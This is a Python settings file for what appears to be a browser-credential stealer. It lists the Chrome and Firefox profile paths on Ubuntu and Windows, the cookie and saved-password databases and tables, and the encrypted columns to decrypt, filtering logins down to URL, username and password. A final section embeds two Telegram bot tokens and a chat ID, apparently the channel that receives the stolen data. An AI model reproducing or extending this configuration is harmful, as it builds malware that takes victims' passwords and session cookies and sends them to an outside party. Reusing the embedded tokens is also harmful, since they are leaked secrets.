from typing import Any

from config.logger_config import setup_logging

setup_logging()

settings: Any = {
    "ubuntu": {
        "browser": [
            {
                "browser_name": "google_chrome",
                "browser_info": {
                    "default_paths": ["~/.config/google-chrome"],
                    "default_profiles": ["Default", "Profile"],
                    "data": [
                        {
                            "data_name": "cookies",
                            "data_info": {
                                "data_file": "Cookies",
                                "data_table_name": "cookies",
                            },
                            "encrypted": [
                                {
                                    "encrypted_column": "encrypted_value",
                                    "saved_column": "value",
                                }
                            ],
                            "filter_columns": "all",
                        },
                        {
                            "data_name": "password",
                            "data_info": {
                                "data_file": "Login Data",
                                "data_table_name": "logins",
                            },
                            "encrypted": [
                                {
                                    "encrypted_column": "password_value",
                                    "saved_column": "password",
                                }
                            ],
                            "filter_columns": [
                                "origin_url",
                                "username_value",
                                "password",
                            ],
                        },
                    ],
                },
            },
            {
                "browser_name": "firefox",
                "browser_info": {
                    "default_paths": [
                        "~/snap/firefox/common/.mozilla/firefox",
                        "~/.mozilla/firefox",
                    ],
                    "default_profiles": [".default"],
                    "data": [
                        {
                            "data_name": "cookies",
                            "data_info": {
                                "data_file": "cookies.sqlite",
                                "data_table_name": "moz_cookies",
                            },
                            "encrypted": [],
                            "filter_columns": "all",
                        },
                        {
                            "data_name": "password",
                            "data_info": {
                                "data_file": "logins.json",
                                "data_table_name": None,
                            },
                            "encrypted": [
                                {
                                    "encrypted_column": "encryptedUsername",
                                    "saved_column": "username",
                                },
                                {
                                    "encrypted_column": "encryptedPassword",
                                    "saved_column": "password",
                                },
                            ],
                            "filter_columns": ["hostname", "username", "password"],
                        },
                    ],
                },
            },
        ]
    },
    "windows": {
        "browser": [
            {
                "browser_name": "google_chrome",
                "browser_info": {
                    "default_paths": [
                        "%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data"
                    ],
                    "default_profiles": ["Default", "Profile"],
                    "data": [
                        {
                            "data_name": "cookies",
                            "data_info": {
                                "data_file": "Network\\Cookies",
                                "data_table_name": "cookies",
                            },
                            "encrypted": [
                                {
                                    "encrypted_column": "encrypted_value",
                                    "saved_column": "value",
                                }
                            ],
                            "filter_columns": "all",
                        },
                        {
                            "data_name": "password",
                            "data_info": {
                                "data_file": "Login Data",
                                "data_table_name": "logins",
                            },
                            "encrypted": [
                                {
                                    "encrypted_column": "password_value",
                                    "saved_column": "password",
                                }
                            ],
                            "filter_columns": [
                                "origin_url",
                                "username_value",
                                "password",
                            ],
                        },
                    ],
                },
            },
            {
                "browser_name": "firefox",
                "browser_info": {
                    "default_paths": ["%APPDATA%\\Mozilla\\Firefox\\Profiles"],
                    "default_profiles": [".default"],
                    "data": [
                        {
                            "data_name": "cookies",
                            "data_info": {
                                "data_file": "cookies.sqlite",
                                "data_table_name": "moz_cookies",
                            },
                            "encrypted": [],
                            "filter_columns": "all",
                        },
                        {
                            "data_name": "password",
                            "data_info": {
                                "data_file": "logins.json",
                                "data_table_name": None,
                            },
                            "encrypted": [
                                {
                                    "encrypted_column": "encryptedUsername",
                                    "saved_column": "username",
                                },
                                {
                                    "encrypted_column": "encryptedPassword",
                                    "saved_column": "password",
                                },
                            ],
                            "filter_columns": ["hostname", "username", "password"],
                        },
                    ],
                },
            },
        ]
    },
    "tele": {
        "list_bot": [
            {
                "BOT_TOKEN": "6292768719:AAEPNvQfeRZM3sCT3dLAZH6btCuERAy1mMA",
                "CHAT_ID": "943423716",
            },
            {
                "BOT_TOKEN": "6188558912:AAHqc1HOpW5jVt8T1_zZuj-jN3UTaDPWr2U",
                "CHAT_ID": "943423716",
            },
        ]
    },
}
